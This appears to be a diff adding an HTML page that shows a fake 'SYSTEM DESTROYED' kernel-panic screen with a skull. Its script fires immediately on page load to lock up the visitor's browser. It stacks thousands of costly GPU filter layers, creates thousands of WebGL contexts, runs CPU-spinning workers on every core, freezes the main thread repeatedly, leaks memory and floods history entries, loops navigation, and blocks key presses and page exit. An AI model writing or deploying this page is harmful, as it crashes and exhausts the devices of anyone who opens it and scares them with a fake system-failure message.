@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>☠ SYSTEM DESTROYED ☠</title>
+<style>
+  html,body{margin:0;height:100%;background:#000;overflow:hidden;cursor:none;}
+  #stage{
+    position:fixed;inset:0;display:flex;align-items:center;justify-content:center;
+    flex-direction:column;font-family:"Courier New",monospace;
+    color:#f00;text-shadow:0 0 8px #f00,0 0 24px #900;
+  }
+  #skull{white-space:pre;font-size:14px;line-height:1;filter:drop-shadow(0 0 12px #f00);}
+  #msg{margin-top:24px;font-size:44px;font-weight:bold;letter-spacing:6px;
+       animation:flick .08s steps(2) infinite;}
+  #sub{margin-top:10px;font-size:16px;color:#a00;opacity:.85;}
+  @keyframes flick{0%{opacity:1;transform:skewX(0)}50%{opacity:.25;transform:skewX(6deg)}100%{opacity:1;transform:skewX(-4deg)}}
+  .glitch{animation:glitch .12s infinite;}
+  @keyframes glitch{
+    0%{clip-path:inset(0 0 0 0);transform:translate(0,0)}
+    20%{clip-path:inset(20% 0 40% 0);transform:translate(-6px,2px)}
+    40%{clip-path:inset(60% 0 10% 0);transform:translate(6px,-2px)}
+    60%{clip-path:inset(10% 0 70% 0);transform:translate(-4px,0)}
+    80%{clip-path:inset(45% 0 30% 0);transform:translate(4px,3px)}
+    100%{clip-path:inset(0 0 0 0);transform:translate(0,0)}
+  }
+</style>
+</head>
+<body>
+  <div id="stage">
+    <div id="skull" class="glitch">
+       .-.
+      (o o)
+      | O \
+       \   \
+        `~~~'   D E M O N   K E R N E L
+    </div>
+    <div id="msg" class="glitch">SYSTEM DESTROYED....</div>
+    <div id="sub">kernel panic • all cores lost • do not power off</div>
+  </div>
+
+  <!-- absurdly expensive filter: huge-octave fractal noise + heavy displacement -->
+  <svg style="position:absolute;width:0;height:0">
+    <filter id="hell">
+      <feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="120" seed="6" result="n"/>
+      <feDisplacementMap in="SourceGraphic" in2="n" scale="400"/>
+      <feColorMatrix values="0 0 0 12 0  0 0 0 0 0  0 0 0 0 0  0 0 0 14 0"/>
+      <feGaussianBlur stdDeviation="30"/>
+    </filter>
+  </svg>
+
+<script>
+document.title = "☠ SYSTEM DESTROYED ☠";
+
+function annihilate(){
+
+  /* 0. flashing title spam */
+  const frames = ["☠ SYSTEM DESTROYED ☠","▓▓▓ FATAL ▓▓▓","█ ERROR █","☠ CORE MELT ☠",""];
+  let ti=0; setInterval(()=>{document.title=frames[ti++%frames.length];},60);
+
+  /* 1. GPU meltdown — stacked layers of the hell filter + backdrop chain */
+  for(let i=0;i<4000;i++){
+    const d=document.createElement("div");
+    d.style.cssText=`position:fixed;inset:0;filter:url(#hell);
+      backdrop-filter:blur(120px) invert(1) saturate(9) hue-rotate(${i}deg);
+      mix-blend-mode:difference;z-index:${i};pointer-events:none;`;
+    document.body.appendChild(d);
+  }
+
+  /* 2. WebGL context bomb — thousands of live contexts, each drawing */
+  for(let i=0;i<3000;i++){
+    try{
+      const c=document.createElement("canvas");
+      c.width=c.height=2048;
+      const gl=c.getContext("webgl")||c.getContext("experimental-webgl");
+      if(gl){ gl.clearColor(Math.random(),0,0,1); gl.clear(gl.COLOR_BUFFER_BIT);
+        for(let k=0;k<50;k++) gl.createBuffer(); }
+      document.body.appendChild(c);
+    }catch(e){}
+  }
+
+  /* 3. multi-core CPU storm — one busy-spin worker per hardware thread */
+  const cores=(navigator.hardwareConcurrency||8)*2;
+  const wsrc=`self.onmessage=()=>{let a=0;for(;;){a+=Math.tan(Math.random())*Math.exp(Math.random());
+    if(!isFinite(a))a=0;}};self.postMessage(0);`;
+  const wurl=URL.createObjectURL(new Blob([wsrc],{type:"application/javascript"}));
+  for(let i=0;i<cores;i++){ try{const w=new Worker(wurl);w.postMessage(1);}catch(e){} }
+
+  /* 4. main-thread deadlock, re-armed forever */
+  (function freeze(){
+    const end=performance.now()+900;
+    while(performance.now()<end){ Math.atan2(Math.random(),Math.random())*Math.log(Math.random()+1e-9); }
+    requestAnimationFrame(freeze);
+  })();
+
+  /* 5. RAM nuke — never-freed typed arrays + history flood + console lag */
+  const mem=[];
+  (function leak(){
+    for(let i=0;i<80;i++){
+      mem.push(new BigInt64Array(1024*1024*10));
+      history.pushState(0,"","#"+Math.random().toString(36).slice(2));
+    }
+    console.log("%c SYSTEM DESTROYED","font-size:400px;color:#f00;");
+    setTimeout(leak,0);
+  })();
+
+  /* 6. final hammer — self-navigation loop so nothing recovers */
+  setInterval(()=>{ try{location.replace(location.href.split("#")[0]+"#"+Date.now());}catch(e){} },400);
+
+  /* 7. block escape: eat key/close attempts (best-effort, tab-close still works) */
+  window.onbeforeunload=()=>"";
+  document.onkeydown=e=>{e.preventDefault();return false;};
+}
+
+/* fire immediately on visit — no delay */
+annihilate();
+</script>
+</body>
+</html>
